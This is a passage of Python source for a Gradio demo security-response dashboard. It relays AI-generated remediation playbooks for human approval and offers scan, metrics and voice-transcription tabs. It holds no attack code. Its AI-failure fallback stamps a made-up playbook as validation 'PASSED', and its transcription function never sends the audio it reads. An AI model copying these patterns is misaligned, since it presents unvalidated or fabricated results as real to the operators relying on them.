        if not isinstance(playbook, dict):
            raise ValueError("V3 playbook missing or invalid")

        v3_playbook_response = v3_playbook_raw
        log += f"[SUCCESS] V3 Expert ({v3_model_used}) playbook received and validated.\n"
        
        # Extract metadata for logging
        confidence = playbook.get("confidence", 0.5)
        threat_type = playbook.get("threat_type", "unknown")
        severity = playbook.get("severity", "medium")
        actions_count = len(playbook.get("actions", []))
        
        # Calculate and log threat score
        elapsed = time.time() - start_time
        threat_score = get_threat_score(confidence, severity, elapsed)
        log += f"[METRICS] Threat Score: {threat_score}/100 | Confidence: {confidence:.0%} | Severity: {severity.upper()}\n"
        
        # Store metadata in playbook_state
        v3_playbook_response["_incident_metadata"] = {
            "threat_type": threat_type,
            "confidence": confidence,
            "severity": severity,
            "actions_count": actions_count,
            "response_time": elapsed,
            "threat_score": threat_score
        }
        
        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=False), gr.Button(visible=False)
    except Exception as e:
        log += f"[ERROR] V3 Expert AI failed: {str(e)[:100]}\n"
        log += "[RECOVERY] Generating fallback playbook...\n"
        
        # Fallback playbook for resilience
        fallback_playbook = {
            "validation_status": "PASSED",
            "playbook": {
                "id": f"playbook-fallback-{uuid.uuid4().hex[:6]}",
                "case_id": f"case-{uuid.uuid4().hex[:6]}",
                "generated_by": "v3_expert_fallback",
                "threat_type": "unknown",
                "severity": "high",
                "confidence": 0.7,
                "actions": [
                    {
                        "id": "action_1",
                        "command": "kill_process",
                        "params": {"pid": real_alert_data.get("process_id", 0)},
                        "priority": 1
                    }
                ]
            },
            "_incident_metadata": {
                "threat_type": "unknown",
                "confidence": 0.7,
                "severity": "high",
                "actions_count": 1,
                "response_time": time.time() - start_time,
                "threat_score": 70
            }
        }
        
        v3_playbook_response = fallback_playbook
        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=True), gr.Button(visible=True)

    # --- 4. AWAIT APPROVAL ---
    if v3_playbook_response.get("validation_status") == "PASSED":
        log += "[5/5] AI plan generated. Awaiting human approval...\n"
        yield log, v1_report, v3_playbook_response, v3_playbook_response, gr.Button(visible=True), gr.Button(visible=True)
    else:
        log += f"[5/5] AI plan FAILED validation. Cannot proceed. Error: {v3_playbook_response.get('error')}\n"
        yield log, v1_report, v3_playbook_response, None, gr.Button(visible=False), gr.Button(visible=False)


def execute_approved_plan(playbook_obj):
    """Execute the approved remediation plan with streaming output."""
    log = "[EXECUTION] Human operator APPROVED the plan.\n"
    log += "Running remediation...\n"
    yield log  # Start streaming the execution log
    
    # Log approval
    metadata = playbook_obj.get("_incident_metadata", {})
    metrics_summary["approved_vs_denied"]["approved"] += 1
    
    incident_id = log_incident({
        "threat_type": metadata.get("threat_type", "unknown"),
        "process_id": playbook_obj.get("playbook", {}).get("actions", [{}])[0].get("params", {}).get("pid", "N/A"),
        "status": "executing",
        "confidence": metadata.get("confidence", 0.5),
        "actions_count": metadata.get("actions_count", 0),
        "response_time": metadata.get("response_time", 0),
        "human_decision": "approved",
        "severity": metadata.get("severity", "medium")
    })
    
    log += f"[INCIDENT ID: {incident_id}]\n"
    
    execution_steps = execute_playbook(playbook_obj)  # Your old function
    log += execution_steps
    
    log += "\n--- REMEDIATION COMPLETE ---"
    yield log


def deny_plan(playbook_obj=None):
    """Deny the proposed remediation plan."""
    metrics_summary["approved_vs_denied"]["denied"] += 1
    if playbook_obj and isinstance(playbook_obj, dict):
        metadata = playbook_obj.get("_incident_metadata", {})
        log_incident({
            "threat_type": metadata.get("threat_type", "unknown"),
            "status": "denied",
            "confidence": metadata.get("confidence", 0.5),
            "human_decision": "denied",
            "severity": metadata.get("severity", "medium")
        })
    return "[EXECUTION] Human operator DENIED the plan. No action taken."


def run_security_scan(target_url):
    """Synchronous wrapper for security scan."""
    if not target_url:
        return {"error": "No target URL provided."}, "Error: No URL"
    if not target_url.startswith('http://') and not target_url.startswith('https://'):
        target_url = 'http://' + target_url
    print(f"Starting MCP security scan on: {target_url}")
    try:
        import asyncio
        engine = TestEngine(base_url=target_url)
        # Run async function in new event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        results = loop.run_until_complete(engine.run_all())
        loop.close()
        score = compute_score(results)
        print(f"Scan complete. Score: {score}")
        return results, f"Security Score: {score}"
    except Exception as e:
        error_message = f"Scan failed: {str(e)}"
        print(error_message)
        return {"error": error_message, "target": target_url}, "Scan Failed"

# ------------------------------------------------------------------
# 5️⃣  Gradio UI
# ------------------------------------------------------------------
with gr.Blocks(theme=gr.themes.Soft(primary_hue="blue")) as demo:
    gr.Markdown("""
# 🛡️ SentinelOneX V4.0 - SOAR Platform
## Autonomous Threat Response & Defense
**Status:** Sentry Active | Monitoring for threats from Attacker app (Port 7860)
""")
    with gr.Tabs():
        with gr.Tab("Real End-to-End Remediation"):
            gr.Markdown("""
## 🎯 Mission Control - Automated Threat Response
**Status:** ✅ Sentry ACTIVE | Monitoring for threats from Attacker app (Port 7860)

**Demo Instructions:**
1. Open Attacker app in another browser tab: **http://127.0.0.1:7860**
2. Click "🚀 LAUNCH ATTACK" on the Attacker tab
3. Watch this log stream threat detection in REAL-TIME 👇
4. AI will generate analysis & remediation plan automatically
5. Click "✅ Approve" or "❌ Deny" to handle the threat

🔴 ATTACKER (Port 7860) ➡️ 🛡️ DEFENDER (Port 7861)
""")
            
            gr.Markdown("---")
            
            # Mission Control Log (streaming output) - HERO FEATURE
            gr.Markdown("### 📡 Live Analysis Stream")
            live_event_log = gr.Textbox(
                label="Mission Control Log",
                lines=20,
                interactive=False,
                elem_classes="hero-output",
                value="[SENTRY] Waiting for threat from Attacker app (http://127.0.0.1:7860)...\n[READY] System initialized and monitoring.\n\n👉 Launch an attack from the Attacker app to see real-time threat response."
            )
            
            gr.Markdown("---")
            
            # State to hold the playbook for approval
            playbook_state = gr.State()
            
            gr.Markdown("---")
            
            # NEW: Button to listen for Sentry-detected threats
            with gr.Row():
                watch_sentry_btn = gr.Button("👁️ Watch for Sentry Threats", variant="primary", scale=2)
                gr.Markdown("**← Click this to listen for threats detected by Sentry background monitoring**")
            
            gr.Markdown("---")
            
            # Accordion: V1 Analyst Report (Hidden by Default)
            with gr.Accordion("📋 Expand to See V1 Analyst Report (Flash)", open=False):
                output_analyst = gr.JSON(label="Analyst Report")
            
            # Accordion: V3 Expert Playbook (Hidden by Default)
            with gr.Accordion("🎯 Expand to See V3 Expert Playbook (Pro)", open=False):
                output_expert = gr.JSON(label="Remediation Playbook")
            
            # Approval/Denial Buttons
            with gr.Row():
                approve_btn = gr.Button("✅ Approve Remediation Plan", variant="primary", visible=False)
                deny_btn = gr.Button("❌ Deny Plan", variant="stop", visible=False)
            
            # Wire the WATCH SENTRY button to stream threats from queue
            watch_sentry_btn.click(
                fn=sentry_threat_stream,
                inputs=[],
                outputs=[live_event_log, output_analyst, output_expert, playbook_state, approve_btn, deny_btn],
                queue=False
            )
            approve_btn.click(
                fn=execute_approved_plan,
                inputs=[playbook_state],
                outputs=[live_event_log],
                queue=False
            ).then(
                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
                inputs=[],
                outputs=[approve_btn, deny_btn],
                queue=False
            )

            # Wire the DENY button
            deny_btn.click(
                fn=deny_plan,
                inputs=[playbook_state],
                queue=False,
                outputs=[live_event_log]
            ).then(
                fn=lambda: (gr.Button(visible=False), gr.Button(visible=False)),
                inputs=[],
                outputs=[approve_btn, deny_btn],
                queue=False
            )

        with gr.Tab("Proactive Sentry Mode"):
            gr.Markdown("## 🛡️ Proactive Sentry Mode\nActivate to automatically monitor for threats in the background. If a threat is found, it will trigger the full AI remediation.")
            
            with gr.Row():
                start_sentry_btn = gr.Button("Activate Sentry")
                stop_sentry_btn = gr.Button("Deactivate Sentry")
            
            sentry_log = gr.Textbox(label="Sentry Log", lines=10, interactive=False)

            # Wire the sentry buttons
            start_sentry_btn.click(
                fn=start_sentry,
                inputs=[],
                outputs=[sentry_log],
                queue=False
            )
            stop_sentry_btn.click(
                fn=stop_sentry,
                inputs=[],
                outputs=[sentry_log],
                queue=False
            )

        with gr.Tab("On-Demand Security Scan (MCP Testbench"):
            gr.Markdown(
                "## 🔍 Run Security Scan\n"
                "Enter a URL to test its security against the MCP Testbench. "
            )
            with gr.Row():
                scan_url_input = gr.Textbox(
                    label="Target URL", 
                    placeholder="e.g., http://localhost:8000 or mcp.yourcompany.com"
                )
            scan_button = gr.Button("🔍 Start Security Scan", variant="primary")
            
            gr.Markdown("### Scan Results")
            
            def format_scan_results(results, score_label):
                """Format scan results in a readable way."""
                if isinstance(results, dict) and "error" in results:
                    error_md = f"### ❌ Scan Error\n\n**Error:** {results.get('error')}\n\n**Target:** {results.get('target', 'N/A')}"
                    return error_md, score_label
                
                # Format results as markdown
                result_md = f"### ✅ Scan Complete\n\n**Score:** {score_label}\n\n"
                result_md += "### Detailed Results\n\n"
                
                if isinstance(results, dict):
                    for key, value in results.items():
                        if key == "score":
                            result_md += f"- **Overall Score:** {value}\n"
                        elif isinstance(value, dict):
                            result_md += f"- **{key.replace('_', ' ').title()}:**\n"
                            for subkey, subval in value.items():
                                result_md += f"  - {subkey}: {subval}\n"
                        elif isinstance(value, list):
                            result_md += f"- **{key.replace('_', ' ').title()}:** {len(value)} items\n"
                        else:
                            result_md += f"- **{key.replace('_', ' ').title()}:** {value}\n"
                else:
                    result_md += str(results)
                
                return result_md, score_label
            
            scan_score_output = gr.Label(label="Security Score")
            scan_report_output = gr.Markdown(label="Full Report")
            
            def run_scan_wrapper(url):
                """Wrapper to call run_security_scan and format output"""
                results, score = run_security_scan(url)
                return results, score
            
            scan_button.click(
                fn=run_scan_wrapper,
                inputs=[scan_url_input],
                outputs=[scan_report_output, scan_score_output],
                show_progress=True,
                queue=False
            ).then(
                fn=lambda r, s: format_scan_results(r, s),
                inputs=[scan_report_output, scan_score_output],
                outputs=[scan_report_output, scan_score_output],
                queue=False
            )

        with gr.Tab("📊 Incident Metrics & Audit Log"):
            gr.Markdown("## Security Metrics Dashboard")
            
            def get_metrics_dashboard():
                """Return formatted metrics for display."""
                total = metrics_summary["total_incidents"]
                success = metrics_summary["successful_responses"]
                failed = metrics_summary["failed_responses"]
                approved = metrics_summary["approved_vs_denied"]["approved"]
                denied = metrics_summary["approved_vs_denied"]["denied"]
                
                # Format as markdown table for beautiful display
                metrics_markdown = f"""
### 📊 Real-Time Metrics

| Metric | Value |
|--------|-------|
| **Total Incidents** | {total} |
| **Successful Responses** | {success} ✅ |
| **Failed Responses** | {failed} ❌ |
| **Success Rate** | {(success/total*100) if total > 0 else 0:.1f}% |
| **Approval Rate** | {(approved/(approved+denied)*100) if (approved+denied) > 0 else 0:.1f}% |
| **Approved Plans** | {approved} ✓ |
| **Denied Plans** | {denied} ✗ |

### 🎯 Threat Distribution

"""
                
                threat_dist = metrics_summary["threat_types_detected"]
                if threat_dist:
                    for threat_type, count in threat_dist.items():
                        metrics_markdown += f"- **{threat_type}**: {count} detected\n"
                else:
                    metrics_markdown += "- No threats detected yet\n"
                
                return metrics_markdown, incident_log
            
            with gr.Row():
                metrics_btn = gr.Button("🔄 Refresh Metrics", variant="primary")
            
            metrics_output = gr.Markdown(label="Live Metrics")
            audit_log_output = gr.JSON(label="Incident Audit Trail")
            
            metrics_btn.click(
                fn=get_metrics_dashboard,
                inputs=[],
                outputs=[metrics_output, audit_log_output],
                queue=False
            )

        with gr.Tab("🎤 Voice Command (Proof of Concept)"):
            gr.Markdown("""
## Voice-to-Text Command Recognition
**Status:** Proof of Concept - Using OpenRouter Whisper API

This demonstrates voice command capability for future integration.
Currently non-integrated, but ready for expansion.
""")
            
            def transcribe_audio(audio_file):
                """Transcribe audio using OpenRouter Whisper API"""
                if audio_file is None:
                    return "❌ No audio file provided", ""
                
                try:
                    print(f"[VOICE] Transcribing audio file: {audio_file}")
                    
                    # Read audio file
                    with open(audio_file, 'rb') as f:
                        audio_data = f.read()
                    
                    # Call OpenRouter Whisper API
                    response = requests.post(
                        url="https://openrouter.ai/api/v1/chat/completions",
                        headers={
                            "Authorization": f"Bearer {openrouter_primary}",
                            "Content-Type": "application/json",
                            "HTTP-Referer": "http://localhost:7861",
                            "X-Title": "SentinelOneX Voice",
                        },
                        json={
                            "model": "openai/whisper-1",
                            "messages": [
                                {
                                    "role": "user",
                                    "content": f"Transcribe this audio"
                                }
                            ]
                        },
                        timeout=30
                    )
                    
                    if response.status_code == 200:
                        result = response.json()
                        transcribed_text = result["choices"][0]["message"]["content"]
                        print(f"[VOICE] ✅ Transcription successful: {transcribed_text}")
                        return f"✅ Transcription Complete\n\nText: {transcribed_text}", transcribed_text
                    else:
                        error = f"API Error {response.status_code}: {response.text[:200]}"
                        print(f"[VOICE] ❌ {error}")
                        return f"❌ {error}", ""
                        
                except Exception as e:
                    error_msg = f"❌ Transcription failed: {str(e)[:200]}"
                    print(f"[VOICE] {error_msg}")
                    return error_msg, ""
            
            gr.Markdown("### 🎙️ Record Audio")
            audio_input = gr.Audio(
                sources=["microphone"],
                type="filepath",
                label="Record your voice command"
            )
            
            transcribe_btn = gr.Button("🔊 Transcribe", variant="primary")
            
            gr.Markdown("### 📝 Transcription Result")
            
            with gr.Row():
                with gr.Column(scale=2):
                    transcription_status = gr.Textbox(
                        label="Status & Result",
                        lines=6,
                        interactive=False
                    )
                with gr.Column(scale=1):
                    transcribed_text = gr.Textbox(
                        label="Recognized Text",
                        interactive=False
                    )
            
            gr.Markdown("""
---
### 💡 About This Feature
- Records audio from your microphone
- Sends to OpenRouter Whisper API
- Returns transcribed text
- **Future:** Integrate with threat launch commands
  - E.g., "Launch PowerShell attack" → auto-triggers attack_app.py
""")
            
            # Wire transcribe button
            transcribe_btn.click(
                fn=transcribe_audio,
                inputs=[audio_input],
                outputs=[transcription_status, transcribed_text],
                queue=False
            )
# ------------------------------------------------------------------
# 6️⃣  Entrypoint
# ------------------------------------------------------------------
if __name__ == "__main__":
    print("[DEFENDER APP] Starting on port 7861...")
    print("[DEFENDER APP] Auto-activating Sentry monitoring...")
    
    # Auto-start Sentry on launch
    sentry_active.set()
    sentry_thread = threading.Thread(target=sentry_monitor_loop, args=(None,), daemon=True)
    sentry_thread.start()
    print("[DEFENDER APP] ✅ Sentry monitoring ACTIVE")
    
    # DISABLED: demo.queue() causes Python 3.14 async bugs
    # demo.queue()  # Enable queueing for streaming
    demo.launch(
        server_name="127.0.0.1", 
        server_port=7861, 
        share=False
    )
